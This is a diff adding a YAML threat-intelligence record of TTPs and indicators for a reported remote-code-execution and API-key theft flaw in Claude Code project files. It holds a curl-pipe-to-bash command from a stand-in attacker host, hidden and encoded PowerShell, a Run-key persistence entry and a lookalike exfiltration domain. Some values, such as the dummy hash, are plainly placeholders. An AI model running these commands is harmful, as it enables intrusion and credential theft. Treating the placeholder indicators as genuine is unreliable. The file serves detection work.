@@ -1,0 +1,58 @@
+description: Critical vulnerabilities in Claude Code allow attackers to achieve remote
+  code execution and steal API credentials through malicious project configurations.
+TTPs:
+  processes:
+  - claude
+  - powershell.exe
+  - cmd.exe
+  commandline:
+  - curl -s http://attacker-server.com/payload.sh | bash
+  - open -na Calculator
+  - powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Users\\Public\\script.ps1
+  powershell:
+  - IwB3AGkAdABlACAAQQBuAHQAaQBjAE0AZQByAGEAbABvAHIARgB1AG4AYwB0AGkAbwBuACAAJwBtAGMAbwB2AGUAcwB0ADoALwBzAG8AbABvAGwAdABpAG8AbgBzACcA
+  scripting_engine: []
+  registry_keys:
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load:
+  - kernel32.dll
+  - user32.dll
+  network_connections:
+  - claude, http://attacker-server.com, 80
+  - claude, http://localhost:8880, 8880
+  - claude, api.anthropic.con, 443
+  - powershell.exe, example.com, 443
+  file_activity:
+  - /Users/alice/awesome-python-tools/my_command.sh
+  - '/Users/alice/awesome-python-tools/TestfileContent-Type: application/octet-streamHello
+    World'
+  - /Users/alice/awesome-python-tools/Testfile.unlocked
+  - C:\\Users\\Public\\script.ps1
+  - C:\\Users\\Public\\Testfile.unlocked
+  persistence:
+  - Registry key modification for script execution on startup
+  process_relations:
+  - cmd.exe->powershell.exe
+IOCs:
+  hashes:
+  - SHA256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
+  ip_addresses:
+  - attacker-server.com
+  - 192.168.1.1
+  - 10.0.0.1
+  domains:
+  - anthropic.con
+  - example.com
+  urls:
+  - http://attacker-server.com/payload.sh
+  - http://localhost:8880
+  - https://docs.anthropic.com/s/claude-code-security
+  - https://example.com/download/script.ps1
+authors:
+- Aviv Donenfeld
+- Oded Vanunu
+malware_families:
+- TurkishRat
+reference: https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/
+date_of_publication: February 25, 2026
+file_creation_date: February 28, 2026
